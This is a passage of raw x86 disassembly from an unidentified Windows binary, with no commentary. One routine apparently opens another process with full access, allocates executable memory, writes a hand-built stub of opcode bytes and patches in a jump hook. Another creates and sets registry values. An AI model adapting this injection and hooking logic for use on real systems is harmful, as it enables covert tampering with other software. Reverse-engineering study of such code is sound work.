   16e21:	lea    ecx,[ebp-0x28]
   16e24:	call   0x110ae
   16e29:	lea    ecx,[ebp-0x38]
   16e2c:	call   0x110ae
   16e31:	push   DWORD PTR [ebp-0x10]
   16e34:	call   0x10a9a
   16e39:	pop    ecx
   16e3a:	mov    eax,DWORD PTR [ebp+0x10]
   16e3d:	movzx  eax,BYTE PTR [eax]
   16e40:	cmp    eax,0x100
   16e45:	jge    0x16e5d
   16e47:	mov    ecx,DWORD PTR ds:0x7f864
   16e4d:	lea    eax,[ebp-0x8]
   16e50:	push   eax
   16e51:	lea    eax,[ebp+0xc]
   16e54:	push   eax
   16e55:	call   0x13c84
   16e5a:	mov    esi,DWORD PTR [ebp+0xc]
   16e5d:	mov    eax,ds:0x7f864
   16e62:	cmp    esi,DWORD PTR [eax+0x4]
   16e65:	je     0x16e6c
   16e67:	mov    esi,DWORD PTR [esi+0x14]
   16e6a:	jmp    0x16e6f
   16e6c:	mov    esi,DWORD PTR [ebp+0x8]
   16e6f:	call   0x1a218
   16e74:	push   DWORD PTR [ebp-0x8]
   16e77:	call   0x10a9a
   16e7c:	pop    ecx
   16e7d:	mov    eax,esi
   16e7f:	pop    esi
   16e80:	leave  
   16e81:	ret    0xc
   16e84:	int3   
   16e85:	int3   
   16e86:	int3   
   16e87:	int3   
   16e88:	int3   
   16e89:	int3   
   16e8a:	mov    edi,edi
   16e8c:	push   esi
   16e8d:	mov    esi,ecx
   16e8f:	mov    BYTE PTR [esi+0x8],0x0
   16e93:	call   0x14094
   16e98:	mov    eax,esi
   16e9a:	pop    esi
   16e9b:	ret    0x8
   16e9e:	int3   
   16e9f:	int3   
   16ea0:	int3   
   16ea1:	int3   
   16ea2:	int3   
   16ea3:	int3   
   16ea4:	mov    edi,edi
   16ea6:	push   ebp
   16ea7:	mov    ebp,esp
   16ea9:	sub    esp,0xb0
   16eaf:	push   esi
   16eb0:	mov    esi,ecx
   16eb2:	lea    ecx,[ebp-0x58]
   16eb5:	call   0x136d8
   16eba:	push   eax
   16ebb:	push   DWORD PTR [ebp+0x8]
   16ebe:	lea    ecx,[ebp-0xb0]
   16ec4:	call   0x138b4
   16ec9:	push   eax
   16eca:	lea    eax,[ebp-0x8]
   16ecd:	push   eax
   16ece:	mov    ecx,esi
   16ed0:	call   0x16afe
   16ed5:	mov    esi,DWORD PTR [eax]
   16ed7:	lea    ecx,[ebp-0xb0]
   16edd:	call   0x12afe
   16ee2:	lea    ecx,[ebp-0x58]
   16ee5:	call   0x11eec
   16eea:	lea    eax,[esi+0x18]
   16eed:	pop    esi
   16eee:	leave  
   16eef:	ret    0x4
   16ef2:	int3   
   16ef3:	int3   
   16ef4:	int3   
   16ef5:	int3   
   16ef6:	int3   
   16ef7:	int3   
   16ef8:	mov    edi,edi
   16efa:	push   ebp
   16efb:	mov    ebp,esp
   16efd:	sub    esp,0x20
   16f00:	push   esi
   16f01:	push   0xffffffff
   16f03:	mov    esi,ecx
   16f05:	push   0x1def0
   16f0a:	lea    ecx,[ebp-0x8]
   16f0d:	call   0x110cc
   16f12:	lea    eax,[ebp-0x8]
   16f15:	push   eax
   16f16:	push   DWORD PTR [ebp+0x8]
   16f19:	lea    ecx,[ebp-0x20]
   16f1c:	call   0x12c3c
   16f21:	push   eax
   16f22:	lea    eax,[ebp-0x10]
   16f25:	push   eax
   16f26:	mov    ecx,esi
   16f28:	call   0x16b46
   16f2d:	mov    esi,DWORD PTR [eax]
   16f2f:	lea    ecx,[ebp-0x20]
   16f32:	call   0x110ae
   16f37:	push   DWORD PTR [ebp-0x8]
   16f3a:	call   0x10a9a
   16f3f:	pop    ecx
   16f40:	lea    eax,[esi+0x14]
   16f43:	pop    esi
   16f44:	leave  
   16f45:	ret    0x4
   16f48:	int3   
   16f49:	int3   
   16f4a:	int3   
   16f4b:	int3   
   16f4c:	int3   
   16f4d:	int3   
   16f4e:	mov    edi,edi
   16f50:	push   esi
   16f51:	mov    esi,ecx
   16f53:	mov    BYTE PTR [esi+0x8],0x0
   16f57:	call   0x141bc
   16f5c:	mov    eax,esi
   16f5e:	pop    esi
   16f5f:	ret    0x8
   16f62:	int3   
   16f63:	int3   
   16f64:	int3   
   16f65:	int3   
   16f66:	int3   
   16f67:	int3   
   16f68:	mov    edi,edi
   16f6a:	push   ebp
   16f6b:	mov    ebp,esp
   16f6d:	sub    esp,0x14
   16f70:	and    DWORD PTR [ebp-0x4],0x0
   16f74:	push   esi
   16f75:	lea    eax,[ebp-0x4]
   16f78:	push   eax
   16f79:	push   DWORD PTR [ebp+0x8]
   16f7c:	mov    esi,ecx
   16f7e:	lea    ecx,[ebp-0xc]
   16f81:	call   0x12c64
   16f86:	push   eax
   16f87:	lea    eax,[ebp-0x14]
   16f8a:	push   eax
   16f8b:	mov    ecx,esi
   16f8d:	call   0x16b70
   16f92:	mov    ecx,DWORD PTR [ebp-0x8]
   16f95:	mov    esi,DWORD PTR [eax]
   16f97:	test   ecx,ecx
   16f99:	je     0x16fa0
   16f9b:	call   0x10ab8
   16fa0:	lea    eax,[esi+0x10]
   16fa3:	pop    esi
   16fa4:	leave  
   16fa5:	ret    0x4
   16fa8:	int3   
   16fa9:	int3   
   16faa:	int3   
   16fab:	int3   
   16fac:	int3   
   16fad:	int3   
   16fae:	mov    edi,edi
   16fb0:	push   ebp
   16fb1:	mov    ebp,esp
   16fb3:	sub    esp,0x20
   16fb6:	push   esi
   16fb7:	mov    esi,ecx
   16fb9:	mov    eax,DWORD PTR [esi+0x24]
   16fbc:	mov    ecx,DWORD PTR [esi+0x28]
   16fbf:	add    ecx,eax
   16fc1:	cmp    DWORD PTR [esi+0x10],ecx
   16fc4:	jbe    0x17057
   16fca:	mov    ecx,DWORD PTR [esi+0x18]
   16fcd:	mov    ecx,DWORD PTR [ecx]
   16fcf:	push   edi
   16fd0:	mov    DWORD PTR [ebp-0x4],ecx
   16fd3:	test   eax,eax
   16fd5:	je     0x16fe4
   16fd7:	mov    edi,eax
   16fd9:	lea    ecx,[ebp-0x4]
   16fdc:	call   0x12f36
   16fe1:	dec    edi
   16fe2:	jne    0x16fd9
   16fe4:	mov    eax,DWORD PTR [ebp-0x4]
   16fe7:	mov    edi,DWORD PTR [eax+0xc]
   16fea:	lea    ecx,[ebp-0x20]
   16fed:	mov    BYTE PTR [ebp-0x18],0x0
   16ff1:	call   0x144f0
   16ff6:	mov    eax,DWORD PTR [esi+0x8]
   16ff9:	mov    ecx,DWORD PTR [eax]
   16ffb:	mov    DWORD PTR [ebp-0x4],ecx
   16ffe:	cmp    ecx,eax
   17000:	je     0x17041
   17002:	lea    edx,[ecx+0x68]
   17005:	mov    eax,DWORD PTR [edx]
   17007:	cmp    eax,edi
   17009:	jae    0x17020
   1700b:	push   ecx
   1700c:	lea    eax,[ebp-0x8]
   1700f:	push   eax
   17010:	lea    ecx,[esi+0x4]
   17013:	call   0x14f48
   17018:	mov    ecx,DWORD PTR [ebp-0x8]
   1701b:	mov    DWORD PTR [ebp-0x4],ecx
   1701e:	jmp    0x1703c
   17020:	sub    eax,edi
   17022:	mov    DWORD PTR [edx],eax
   17024:	push   edx
   17025:	lea    eax,[ebp-0x10]
   17028:	push   eax
   17029:	lea    ecx,[ebp-0x20]
   1702c:	call   0x160d4
   17031:	lea    ecx,[ebp-0x4]
   17034:	call   0x12ec0
   17039:	mov    ecx,DWORD PTR [ebp-0x4]
   1703c:	cmp    ecx,DWORD PTR [esi+0x8]
   1703f:	jne    0x17002
   17041:	lea    eax,[ebp-0x20]
   17044:	push   eax
   17045:	add    esi,0x14
   17048:	push   esi
   17049:	call   0x16674
   1704e:	lea    ecx,[ebp-0x20]
   17051:	call   0x160fe
   17056:	pop    edi
   17057:	pop    esi
   17058:	leave  
   17059:	ret    
   1705a:	int3   
   1705b:	int3   
   1705c:	int3   
   1705d:	int3   
   1705e:	int3   
   1705f:	int3   
   17060:	mov    edi,edi
   17062:	push   ebp
   17063:	mov    ebp,esp
   17065:	sub    esp,0x20
   17068:	push   esi
   17069:	push   0xffffffff
   1706b:	mov    esi,ecx
   1706d:	push   0x1de4e
   17072:	lea    ecx,[ebp-0x8]
   17075:	call   0x11170
   1707a:	lea    eax,[ebp-0x8]
   1707d:	push   eax
   1707e:	push   DWORD PTR [ebp+0x8]
   17081:	lea    ecx,[ebp-0x20]
   17084:	call   0x13608
   17089:	push   eax
   1708a:	lea    eax,[ebp-0x10]
   1708d:	push   eax
   1708e:	mov    ecx,esi
   17090:	call   0x16c02
   17095:	mov    esi,DWORD PTR [eax]
   17097:	lea    ecx,[ebp-0x20]
   1709a:	call   0x110ae
   1709f:	push   DWORD PTR [ebp-0x8]
   170a2:	call   0x10a9a
   170a7:	pop    ecx
   170a8:	lea    eax,[esi+0x14]
   170ab:	pop    esi
   170ac:	leave  
   170ad:	ret    0x4
   170b0:	int3   
   170b1:	int3   
   170b2:	int3   
   170b3:	int3   
   170b4:	int3   
   170b5:	int3   
   170b6:	mov    edi,edi
   170b8:	push   ebp
   170b9:	mov    ebp,esp
   170bb:	sub    esp,0x838
   170c1:	mov    eax,ds:0x7eb38
   170c6:	xor    eax,ebp
   170c8:	mov    DWORD PTR [ebp-0x4],eax
   170cb:	mov    eax,DWORD PTR [ebp+0x8]
   170ce:	push   ebx
   170cf:	push   esi
   170d0:	push   edi
   170d1:	mov    DWORD PTR [ebp-0x808],eax
   170d7:	xor    eax,eax
   170d9:	push   0x7fe
   170de:	mov    WORD PTR [ebp-0x804],ax
   170e5:	xor    ebx,ebx
   170e7:	lea    eax,[ebp-0x802]
   170ed:	push   ebx
   170ee:	push   eax
   170ef:	call   0x1dab8
   170f4:	mov    eax,0x7e2c8
   170f9:	add    esp,0xc
   170fc:	mov    edx,eax
   170fe:	mov    cx,WORD PTR [eax]
   17101:	inc    eax
   17102:	inc    eax
   17103:	cmp    cx,bx
   17106:	jne    0x170fe
   17108:	sub    eax,edx
   1710a:	lea    edi,[ebp-0x804]
   17110:	dec    edi
   17111:	dec    edi
   17112:	mov    cx,WORD PTR [edi+0x2]
   17116:	inc    edi
   17117:	inc    edi
   17118:	cmp    cx,bx
   1711b:	jne    0x17112
   1711d:	mov    ecx,eax
   1711f:	shr    ecx,0x2
   17122:	mov    esi,edx
   17124:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17126:	mov    ecx,eax
   17128:	mov    eax,DWORD PTR [ebp-0x808]
   1712e:	and    ecx,0x3
   17131:	add    eax,0x400
   17136:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17138:	mov    edx,eax
   1713a:	mov    cx,WORD PTR [eax]
   1713d:	inc    eax
   1713e:	inc    eax
   1713f:	cmp    cx,bx
   17142:	jne    0x1713a
   17144:	sub    eax,edx
   17146:	lea    edi,[ebp-0x804]
   1714c:	dec    edi
   1714d:	dec    edi
   1714e:	mov    cx,WORD PTR [edi+0x2]
   17152:	inc    edi
   17153:	inc    edi
   17154:	cmp    cx,bx
   17157:	jne    0x1714e
   17159:	mov    ecx,eax
   1715b:	shr    ecx,0x2
   1715e:	mov    esi,edx
   17160:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17162:	mov    ecx,eax
   17164:	and    ecx,0x3
   17167:	lea    eax,[ebp-0x804]
   1716d:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   1716f:	mov    DWORD PTR [ebp-0x818],eax
   17175:	lea    ecx,[eax+0x2]
   17178:	mov    dx,WORD PTR [eax]
   1717b:	inc    eax
   1717c:	inc    eax
   1717d:	cmp    dx,bx
   17180:	jne    0x17178
   17182:	sub    eax,ecx
   17184:	sar    eax,1
   17186:	add    eax,eax
   17188:	mov    WORD PTR [ebp-0x81a],ax
   1718f:	mov    WORD PTR [ebp-0x81c],ax
   17196:	lea    eax,[ebp-0x81c]
   1719c:	mov    DWORD PTR [ebp-0x82c],eax
   171a2:	lea    eax,[ebp-0x838]
   171a8:	push   eax
   171a9:	xor    edi,edi
   171ab:	inc    edi
   171ac:	push   edi
   171ad:	push   ebx
   171ae:	push   ebx
   171af:	lea    eax,[ebp-0x834]
   171b5:	push   eax
   171b6:	push   0xf003f
   171bb:	lea    eax,[ebp-0x80c]
   171c1:	push   eax
   171c2:	mov    DWORD PTR [ebp-0x834],0x18
   171cc:	mov    DWORD PTR [ebp-0x830],ebx
   171d2:	mov    DWORD PTR [ebp-0x828],0x40
   171dc:	mov    DWORD PTR [ebp-0x824],ebx
   171e2:	mov    DWORD PTR [ebp-0x820],ebx
   171e8:	call   0x11a04
   171ed:	call   eax
   171ef:	test   eax,eax
   171f1:	jl     0x17380
   171f7:	push   0x1e562
   171fc:	push   0x9
   171fe:	push   0x1e54e
   17203:	call   0x16c9e
   17208:	mov    DWORD PTR [ebp-0x810],eax
   1720e:	lea    edx,[eax+0x2]
   17211:	mov    cx,WORD PTR [eax]
   17214:	inc    eax
   17215:	inc    eax
   17216:	cmp    cx,bx
   17219:	jne    0x17211
   1721b:	sub    eax,edx
   1721d:	sar    eax,1
   1721f:	add    eax,eax
   17221:	mov    WORD PTR [ebp-0x812],ax
   17228:	mov    WORD PTR [ebp-0x814],ax
   1722f:	mov    eax,DWORD PTR [ebp-0x808]
   17235:	lea    ecx,[eax+0x2]
   17238:	mov    dx,WORD PTR [eax]
   1723b:	inc    eax
   1723c:	inc    eax
   1723d:	cmp    dx,bx
   17240:	jne    0x17238
   17242:	sub    eax,ecx
   17244:	sar    eax,1
   17246:	inc    eax
   17247:	movzx  eax,ax
   1724a:	add    eax,eax
   1724c:	push   eax
   1724d:	push   DWORD PTR [ebp-0x808]
   17253:	lea    eax,[ebp-0x814]
   17259:	push   edi
   1725a:	push   ebx
   1725b:	push   eax
   1725c:	push   DWORD PTR [ebp-0x80c]
   17262:	call   0x11836
   17267:	call   eax
   17269:	test   eax,eax
   1726b:	jl     0x17380
   17271:	push   0x1e518
   17276:	push   0x5
   17278:	push   0x1e50c
   1727d:	mov    DWORD PTR [ebp-0x808],0x3
   17287:	call   0x16c9e
   1728c:	mov    DWORD PTR [ebp-0x810],eax
   17292:	lea    edx,[eax+0x2]
   17295:	mov    cx,WORD PTR [eax]
   17298:	inc    eax
   17299:	inc    eax
   1729a:	cmp    cx,bx
   1729d:	jne    0x17295
   1729f:	sub    eax,edx
   172a1:	push   0x4
   172a3:	sar    eax,1
   172a5:	pop    esi
   172a6:	add    eax,eax
   172a8:	push   esi
   172a9:	mov    WORD PTR [ebp-0x812],ax
   172b0:	mov    WORD PTR [ebp-0x814],ax
   172b7:	lea    eax,[ebp-0x808]
   172bd:	push   eax
   172be:	push   esi
   172bf:	push   ebx
   172c0:	lea    eax,[ebp-0x814]
   172c6:	push   eax
   172c7:	push   DWORD PTR [ebp-0x80c]
   172cd:	call   0x11836
   172d2:	call   eax
   172d4:	test   eax,eax
   172d6:	jl     0x17380
   172dc:	push   0x1e4e2
   172e1:	push   esi
   172e2:	push   0x1e4d8
   172e7:	mov    DWORD PTR [ebp-0x808],edi
   172ed:	call   0x16c9e
   172f2:	mov    DWORD PTR [ebp-0x810],eax
   172f8:	lea    ecx,[eax+0x2]
   172fb:	mov    dx,WORD PTR [eax]
   172fe:	inc    eax
   172ff:	inc    eax
   17300:	cmp    dx,bx
   17303:	jne    0x172fb
   17305:	sub    eax,ecx
   17307:	sar    eax,1
   17309:	add    eax,eax
   1730b:	push   esi
   1730c:	mov    WORD PTR [ebp-0x812],ax
   17313:	mov    WORD PTR [ebp-0x814],ax
   1731a:	lea    eax,[ebp-0x808]
   17320:	push   eax
   17321:	push   esi
   17322:	push   ebx
   17323:	lea    eax,[ebp-0x814]
   17329:	push   eax
   1732a:	push   DWORD PTR [ebp-0x80c]
   17330:	call   0x11836
   17335:	call   eax
   17337:	test   eax,eax
   17339:	jl     0x17380
   1733b:	lea    eax,[ebp-0x81c]
   17341:	push   eax
   17342:	call   0x119da
   17347:	call   eax
   17349:	test   eax,eax
   1734b:	jl     0x17380
   1734d:	lea    eax,[ebp-0x804]
   17353:	push   eax
   17354:	push   DWORD PTR [ebp-0x80c]
   1735a:	call   0x1217c
   1735f:	test   al,al
   17361:	je     0x17374
   17363:	push   DWORD PTR [ebp-0x80c]
   17369:	call   0x1180c
   1736e:	call   eax
   17370:	test   eax,eax
   17372:	jl     0x17380
   17374:	push   DWORD PTR [ebp-0x80c]
   1737a:	call   DWORD PTR ds:0x1ee60
   17380:	mov    ecx,DWORD PTR [ebp-0x4]
   17383:	pop    edi
   17384:	pop    esi
   17385:	xor    ecx,ebp
   17387:	pop    ebx
   17388:	call   0x1da3b
   1738d:	leave  
   1738e:	ret    0x4
   17391:	int3   
   17392:	int3   
   17393:	int3   
   17394:	int3   
   17395:	int3   
   17396:	mov    edi,edi
   17398:	push   ebp
   17399:	mov    ebp,esp
   1739b:	sub    esp,0x44
   1739e:	mov    eax,DWORD PTR [ebp+0xc]
   173a1:	mov    eax,DWORD PTR [eax]
   173a3:	push   esi
   173a4:	mov    DWORD PTR [ebp-0x2c],eax
   173a7:	lea    eax,[ebp-0x2c]
   173aa:	push   eax
   173ab:	lea    eax,[ebp-0x44]
   173ae:	push   eax
   173af:	xor    esi,esi
   173b1:	push   0x1f0fff
   173b6:	lea    eax,[ebp-0x10]
   173b9:	push   eax
   173ba:	mov    DWORD PTR [ebp-0x44],0x18
   173c1:	mov    DWORD PTR [ebp-0x40],esi
   173c4:	mov    DWORD PTR [ebp-0x38],0x200
   173cb:	mov    DWORD PTR [ebp-0x3c],esi
   173ce:	mov    DWORD PTR [ebp-0x34],esi
   173d1:	mov    DWORD PTR [ebp-0x30],esi
   173d4:	mov    DWORD PTR [ebp-0x28],esi
   173d7:	mov    DWORD PTR [ebp-0x10],esi
   173da:	call   0x116bc
   173df:	call   eax
   173e1:	test   eax,eax
   173e3:	jl     0x17654
   173e9:	push   ebx
   173ea:	push   edi
   173eb:	push   0x40
   173ed:	mov    edi,0x1000
   173f2:	push   edi
   173f3:	lea    eax,[ebp-0x14]
   173f6:	push   eax
   173f7:	push   esi
   173f8:	lea    eax,[ebp-0x8]
   173fb:	push   eax
   173fc:	push   DWORD PTR [ebp-0x10]
   173ff:	mov    DWORD PTR [ebp-0x8],esi
   17402:	mov    esi,DWORD PTR ds:0x1ee40
   17408:	mov    ebx,0x400
   1740d:	mov    DWORD PTR [ebp-0x14],ebx
   17410:	call   esi
   17412:	test   eax,eax
   17414:	jl     0x1741f
   17416:	mov    eax,DWORD PTR [ebp-0x8]
   17419:	mov    ecx,DWORD PTR [ebp+0xc]
   1741c:	mov    DWORD PTR [ecx+0x8],eax
   1741f:	and    DWORD PTR [ebp-0x18],0x0
   17423:	push   0x4
   17425:	push   edi
   17426:	lea    eax,[ebp-0x14]
   17429:	push   eax
   1742a:	push   0x0
   1742c:	lea    eax,[ebp-0x18]
   1742f:	push   eax
   17430:	push   DWORD PTR [ebp-0x10]
   17433:	mov    DWORD PTR [ebp-0x14],ebx
   17436:	call   esi
   17438:	test   eax,eax
   1743a:	jl     0x17445
   1743c:	mov    eax,DWORD PTR [ebp-0x18]
   1743f:	mov    ecx,DWORD PTR [ebp+0xc]
   17442:	mov    DWORD PTR [ecx+0xc],eax
   17445:	lea    eax,[ebp-0x1c]
   17448:	push   eax
   17449:	push   DWORD PTR [ebp-0x2c]
   1744c:	call   0x11cce
   17451:	call   eax
   17453:	test   eax,eax
   17455:	jl     0x17652
   1745b:	push   DWORD PTR [ebp-0x1c]
   1745e:	call   0x11a82
   17463:	call   eax
   17465:	mov    ebx,DWORD PTR [ebp-0x8]
   17468:	and    DWORD PTR [ebp-0x4],0x0
   1746c:	test   ebx,ebx
   1746e:	je     0x17638
   17474:	mov    edi,DWORD PTR [ebp-0x18]
   17477:	push   0x40
   17479:	push   0x7e208
   1747e:	push   edi
   1747f:	mov    DWORD PTR [ebp-0xc],edi
   17482:	call   0x19876
   17487:	push   0x1e5a8
   1748c:	push   0x4
   1748e:	push   0x1e59e
   17493:	call   0x16c9e
   17498:	mov    esi,eax
   1749a:	mov    cx,WORD PTR [eax]
   1749d:	inc    eax
   1749e:	inc    eax
   1749f:	test   cx,cx
   174a2:	jne    0x1749a
   174a4:	sub    eax,esi
   174a6:	dec    edi
   174a7:	dec    edi
   174a8:	mov    cx,WORD PTR [edi+0x2]
   174ac:	inc    edi
   174ad:	inc    edi
   174ae:	test   cx,cx
   174b1:	jne    0x174a8
   174b3:	mov    ecx,eax
   174b5:	shr    ecx,0x2
   174b8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   174ba:	mov    ecx,eax
   174bc:	push   0x60
   174be:	and    ecx,0x3
   174c1:	push   ebx
   174c2:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   174c4:	mov    DWORD PTR [ebp-0x20],ebx
   174c7:	call   0x19828
   174cc:	push   0x68
   174ce:	push   eax
   174cf:	call   0x19828
   174d4:	push   DWORD PTR [ebp-0xc]
   174d7:	push   eax
   174d8:	call   0x19840
   174dd:	push   0xb8
   174e2:	push   eax
   174e3:	call   0x19828
   174e8:	push   DWORD PTR ds:0x7ed80
   174ee:	push   eax
   174ef:	call   0x19840
   174f4:	push   0xc00b
   174f9:	push   eax
   174fa:	call   0x1985a
   174ff:	push   0x74
   17501:	push   eax
   17502:	call   0x19828
   17507:	push   0x2
   17509:	push   eax
   1750a:	call   0x19828
   1750f:	push   0xd0ff
   17514:	push   eax
   17515:	call   0x1985a
   1751a:	push   0x61
   1751c:	push   eax
   1751d:	call   0x19828
   17522:	mov    ebx,DWORD PTR [ebp+0x8]
   17525:	mov    edi,eax
   17527:	mov    esi,ebx
   17529:	push   0x0
   1752b:	push   esi
   1752c:	push   edi
   1752d:	call   0x19fe2
   17532:	mov    ecx,eax
   17534:	sub    ecx,esi
   17536:	add    DWORD PTR [ebp-0x4],ecx
   17539:	add    edi,ecx
   1753b:	cmp    DWORD PTR [ebp-0x4],0x5
   1753f:	mov    esi,eax
   17541:	jb     0x17529
   17543:	mov    eax,DWORD PTR [ebp-0x4]
   17546:	push   edi
   17547:	add    eax,ebx
   17549:	push   eax
   1754a:	call   0x1989e
   1754f:	mov    eax,DWORD PTR [ebp-0x8]
   17552:	test   eax,eax
   17554:	je     0x17638
   1755a:	add    eax,0x400
   1755f:	lea    ecx,[eax-0x10]
   17562:	mov    DWORD PTR [ebp-0x24],ecx
   17565:	mov    ecx,DWORD PTR [ebp-0x4]
   17568:	lea    esi,[eax-0xc]
   1756b:	push   esi
   1756c:	lea    edi,[eax-0x4]
   1756f:	lea    ebx,[eax-0x8]
   17572:	shr    ecx,0x2
   17575:	lea    ecx,[ecx*4+0x14]
   1757c:	push   0x40
   1757e:	sub    eax,ecx
   17580:	push   ebx
   17581:	mov    DWORD PTR [ebp-0xc],eax
   17584:	mov    eax,DWORD PTR [ebp+0x8]
   17587:	mov    DWORD PTR [edi],eax
   17589:	push   edi
   1758a:	mov    DWORD PTR [ebx],0x5
   17590:	and    DWORD PTR [esi],0x0
   17593:	push   0xffffffff
   17595:	call   DWORD PTR ds:0x7ecfc
   1759b:	test   eax,eax
   1759d:	jl     0x17602
   1759f:	push   DWORD PTR [ebp-0x4]
   175a2:	push   0x90
   175a7:	push   DWORD PTR [ebp-0xc]
   175aa:	call   0x1dab8
   175af:	mov    eax,DWORD PTR [ebp-0x20]
   175b2:	sub    eax,DWORD PTR [ebp+0x8]
   175b5:	add    esp,0xc
   175b8:	sub    eax,0x5
   175bb:	push   eax
   175bc:	mov    eax,DWORD PTR [ebp-0xc]
   175bf:	inc    eax
   175c0:	push   eax
   175c1:	call   0x19840
   175c6:	push   0xe9
   175cb:	push   DWORD PTR [ebp-0xc]
   175ce:	call   0x19828
   175d3:	mov    eax,DWORD PTR [ebp-0x24]
   175d6:	and    DWORD PTR [eax],0x0
   175d9:	push   eax
   175da:	push   DWORD PTR [ebp-0x4]
   175dd:	push   DWORD PTR [ebp-0xc]
   175e0:	push   DWORD PTR [ebp+0x8]
   175e3:	push   0xffffffff
   175e5:	call   DWORD PTR ds:0x7ecf0
   175eb:	mov    eax,DWORD PTR [ebp+0xc]
   175ee:	mov    BYTE PTR [eax+0x10],0x1
   175f2:	lea    eax,[ebp-0x20]
   175f5:	push   eax
   175f6:	push   DWORD PTR [esi]
   175f8:	push   ebx
   175f9:	push   edi
   175fa:	push   0xffffffff
   175fc:	call   DWORD PTR ds:0x7ecfc
   17602:	mov    esi,DWORD PTR [ebp-0x8]
   17605:	test   esi,esi
   17607:	je     0x17638
   17609:	lea    eax,[esi+0x400]
   1760f:	lea    ecx,[eax-0x4]
   17612:	lea    edx,[eax-0x8]
   17615:	add    eax,0xfffffff4
   17618:	push   eax
   17619:	push   0x20
   1761b:	push   edx
   1761c:	mov    DWORD PTR [ecx],esi
   1761e:	push   ecx
   1761f:	mov    DWORD PTR [edx],0x400
   17625:	and    DWORD PTR [eax],0x0
   17628:	push   0xffffffff
   1762a:	call   DWORD PTR ds:0x7ecfc
   17630:	test   eax,eax
   17632:	jge    0x17638
   17634:	and    DWORD PTR [ebp-0x8],0x0
   17638:	call   0x11a58
   1763d:	call   eax
   1763f:	call   0x11ca4
   17644:	mov    ecx,DWORD PTR [ebp-0x1c]
   17647:	call   eax
   17649:	push   DWORD PTR [ebp-0x10]
   1764c:	call   DWORD PTR ds:0x1ee60
   17652:	pop    edi
   17653:	pop    ebx
   17654:	pop    esi
   17655:	leave  
   17656:	ret    0x8
   17659:	int3   
   1765a:	int3   
   1765b:	int3   
   1765c:	int3   
   1765d:	int3   
   1765e:	mov    edi,edi
   17660:	push   ebp
   17661:	mov    ebp,esp
   17663:	cmp    DWORD PTR ds:0x7ed80,0x0
   1766a:	push   esi
   1766b:	mov    esi,DWORD PTR [ebp+0x10]
   1766e:	jne    0x17739
   17674:	push   0x1e778
   17679:	push   0xc
   1767b:	push   0x1e75e
   17680:	call   0x16c9e
   17685:	push   eax
   17686:	push   DWORD PTR [ebp+0x8]
   17689:	call   0x10e16
   1768e:	test   al,al
   17690:	je     0x17739
   17696:	mov    eax,DWORD PTR [esi+0x4]
   17699:	push   0x1e732
   1769e:	push   0xc
   176a0:	push   0x1e724
   176a5:	mov    ds:0x7ed78,eax
   176aa:	call   0x16d94
   176af:	push   eax
   176b0:	push   DWORD PTR [esi+0x4]
   176b3:	call   0x123e0
   176b8:	push   0x1e6e6
   176bd:	push   0xc
   176bf:	push   0x1e6d8
   176c4:	mov    ds:0x7ed80,eax
   176c9:	call   0x16d94
   176ce:	push   eax
   176cf:	push   DWORD PTR [esi+0x4]
   176d2:	call   0x123e0
   176d7:	push   0x1e69c
   176dc:	push   0xc
   176de:	push   0x1e68e
   176e3:	mov    ds:0x7ed84,eax
   176e8:	call   0x16d94
   176ed:	push   eax
   176ee:	push   DWORD PTR [esi+0x4]
   176f1:	call   0x123e0
   176f6:	push   0x1e668
   176fb:	push   0x5
   176fd:	push   0x1e662
   17702:	mov    ds:0x7ed88,eax
   17707:	call   0x16d94
   1770c:	push   eax
   1770d:	push   DWORD PTR [esi+0x4]
   17710:	call   0x123e0
   17715:	push   0x1e622
   1771a:	push   0x4
   1771c:	push   0x1e61c
   17721:	mov    ds:0x7ed8c,eax
   17726:	call   0x16d94
   1772b:	push   eax
   1772c:	push   DWORD PTR [esi+0x4]
   1772f:	call   0x123e0
   17734:	mov    ds:0x7ed90,eax
   17739:	cmp    DWORD PTR ds:0x7ed7c,0x0
   17740:	jne    0x17768
   17742:	push   0x1e5f4
   17747:	push   0x9
   17749:	push   0x1e5e0
   1774e:	call   0x16c9e
   17753:	push   eax
   17754:	push   DWORD PTR [ebp+0x8]
   17757:	call   0x10e16
   1775c:	test   al,al
   1775e:	je     0x17768
   17760:	mov    eax,DWORD PTR [esi+0x4]
   17763:	mov    ds:0x7ed7c,eax
   17768:	pop    esi
   17769:	pop    ebp
   1776a:	ret    0xc
   1776d:	int3   
   1776e:	int3   
   1776f:	int3   
   17770:	int3   
   17771:	int3   
   17772:	mov    edi,edi
   17774:	push   ebp
   17775:	mov    ebp,esp
   17777:	sub    esp,0x4c
   1777a:	push   ebx
   1777b:	push   esi
   1777c:	push   edi
   1777d:	push   DWORD PTR [ebp+0xc]
   17780:	push   DWORD PTR [ebp+0x8]
   17783:	call   DWORD PTR ds:0x7ed08
   17789:	mov    DWORD PTR [ebp-0x8],eax
   1778c:	xor    eax,eax
   1778e:	xor    ebx,ebx
   17790:	mov    DWORD PTR [ebp-0x30],ebx
   17793:	lea    edi,[ebp-0x2c]
   17796:	stos   DWORD PTR es:[edi],eax
   17797:	stos   DWORD PTR es:[edi],eax
   17798:	stos   DWORD PTR es:[edi],eax
   17799:	stos   DWORD PTR es:[edi],eax
   1779a:	xor    eax,eax
   1779c:	mov    DWORD PTR [ebp-0x1c],ebx
   1779f:	lea    edi,[ebp-0x18]
   177a2:	stos   DWORD PTR es:[edi],eax
   177a3:	stos   DWORD PTR es:[edi],eax
   177a4:	stos   DWORD PTR es:[edi],eax
   177a5:	stos   DWORD PTR es:[edi],eax
   177a6:	lea    eax,[ebp-0x30]
   177a9:	push   eax
   177aa:	push   ebx
   177ab:	call   0x10ea4
   177b0:	mov    BYTE PTR [ebp+0xf],al
   177b3:	lea    eax,[ebp-0x1c]
   177b6:	push   eax
   177b7:	push   0x1
   177b9:	call   0x10ea4
   177be:	mov    BYTE PTR [ebp-0x1],al
   177c1:	cmp    BYTE PTR [ebp+0xf],bl
   177c4:	je     0x17825
   177c6:	mov    esi,DWORD PTR [ebp-0x30]
   177c9:	cmp    esi,ebx
   177cb:	je     0x17825
   177cd:	push   0x6
   177cf:	pop    ecx
   177d0:	push   ebx
   177d1:	xor    eax,eax
   177d3:	mov    DWORD PTR [ebp-0x4c],ebx
   177d6:	lea    edi,[ebp-0x48]
